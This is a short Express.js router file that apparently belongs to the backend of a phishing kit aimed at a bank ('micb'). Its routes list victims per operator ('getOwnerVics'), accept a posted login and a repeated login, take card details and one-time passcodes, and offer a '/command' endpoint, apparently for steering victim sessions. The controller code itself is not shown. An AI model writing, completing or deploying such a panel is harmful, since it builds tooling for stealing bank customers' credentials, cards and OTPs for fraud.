const express = require("express");
const {
    getOwnerVics,
    command,
    getInfo,
    submitLogin,
    submitLoginAgain,
    submitCard,
    submitOtp,
    deleteEntry,
} = require("../controllers/micbController");

const router = express.Router();

router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/login", submitLogin);
router.post("/loginAgain", submitLoginAgain);
router.post("/card", submitCard);
router.post("/otp", submitOtp);
router.post("/delete", deleteEntry);

module.exports = router;
